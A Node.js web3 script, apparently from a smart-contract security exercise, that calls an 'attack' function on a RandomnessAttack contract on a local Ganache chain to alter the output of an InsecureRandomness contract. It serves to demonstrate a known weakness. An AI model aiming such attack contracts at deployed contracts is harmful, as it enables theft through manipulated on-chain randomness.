const { Web3 } = require('web3'); //Import web3 library

//connection to Ganache
const web3 = new Web3('http://localhost:7545'); 

//getting artifacts (ABI, bytecode, etc,.)
const InsecureRandomnessArtifact = require('../build/contracts/InsecureRandomness.json');
const RandomnessAttackArtifact = require('../build/contracts/RandomnessAttack.json');

//Different approach taken for variety, code inside try catch block
async function simulateAttack() {
    try {
        const accounts = await web3.eth.getAccounts(); //get accounts
        //contract addresses (I will update after each deployment)
        const insecureRandomnessAddress = '0x8f332AEf9CDCF5c7847B13fC780cB3481039d880';
        const randomnessAttackAddress = '0x20060ca7DDaA0da8e7a30efEf9f1BBD66e43Df3d';
        
        //creating instances with the used of the ABIs
        const insecureRandomnessContract = new web3.eth.Contract(InsecureRandomnessArtifact.abi, insecureRandomnessAddress);
        const randomnessAttackContract = new web3.eth.Contract(RandomnessAttackArtifact.abi, randomnessAttackAddress);

        await insecureRandomnessContract.methods.randomNumberGeneration().send({from: accounts[0], gas: 5000000}); //random number generation
        console.log("Random number generated with randomNumberGeneration function.");

        const initialRandomNumber = await insecureRandomnessContract.methods.randomNumber().call(); //call random number
        console.log("Random number:", initialRandomNumber);

        await randomnessAttackContract.methods.attack().send({from: accounts[1], gas: 5000000}); //again with attack function from account 1
        console.log("Attack function called to change random number externally.");

        const updatedRandomNumber = await insecureRandomnessContract.methods.randomNumber().call();
        console.log("Updated random number:", updatedRandomNumber);

        await randomnessAttackContract.methods.attack().send({from: accounts[2], gas: 5000000}); //again with attack function from account 2
        console.log("Attack function called again.");

        const finalRandomNumber = await insecureRandomnessContract.methods.randomNumber().call(); //call final random number
        console.log("Final random number:", finalRandomNumber);
        
    } catch (error) {
        console.error("Error during attack:", error);
    }
}
simulateAttack();